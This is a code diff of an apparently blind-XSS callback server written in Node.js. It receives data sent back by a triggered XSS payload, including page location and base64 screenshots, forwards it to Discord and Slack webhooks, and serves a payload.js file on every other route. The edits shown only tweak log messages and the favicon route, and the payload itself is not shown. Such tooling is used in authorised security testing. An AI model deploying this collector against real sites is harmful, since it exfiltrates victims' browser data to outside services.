@@ -163,18 +163,19 @@ app.post("/c", async (req, res) => {
     if (discord_incoming_webhook !== undefined && discord_incoming_webhook != "") {
         request.post(discord_incoming_webhook, { form: { username: "bxss", content: location } }, function (error, response, body) {
             //console.log(body);
-            console.log("[!] XSS blind payload triggered! Data sent to discord.");
+            console.log("[!] XSS blind payload triggered! Data sent to discord.\n");
         });
     }
 
     if (slack_incoming_webhook !== undefined && slack_incoming_webhook != "") {
         request.post(slack_incoming_webhook, data, (out) => {
-            console.log("[!] XSS blind payload triggered! Data sent to slack.");
+            console.log("[!] XSS blind payload triggered! Data sent to slack.\n");
         });
     }
 
     // send screenshot
     if (data["Screenshot"]) {
+        console.log("Sending screenshot.\n")
         const encoded_screenshot = data["Screenshot"].replace("data:image/png;base64,", "");
 
         sendBase64ImageToDiscord(encoded_screenshot)
@@ -188,7 +189,7 @@ app.post("/c", async (req, res) => {
 /**
  * Route to ignore favicon :)
  */
-app.get("/favicon.ico", async (req, res) => {
+app.get("/favicon*", async (req, res) => {
 
     res.send("ok");
     res.end();
@@ -204,13 +205,13 @@ app.all("/*", (req, res) => {
     if (discord_incoming_webhook !== undefined && discord_incoming_webhook != "") {
         request.post(discord_incoming_webhook, { form: { username: "bxss", content: alert } }, function (error, response, body) {
             //console.log(body);
-            console.log("[!] request sent to discord.");
+            console.log("[!] request sent to discord.\n");
         });
     }
 
     if (slack_incoming_webhook !== undefined && slack_incoming_webhook != "") {
         request.post(slack_incoming_webhook, data, (out) => {
-            console.log("[!] request sent to slack.");
+            console.log("[!] request sent to slack.\n");
         });
     }
     res.sendFile(path.join(__dirname + "/payload.js"));
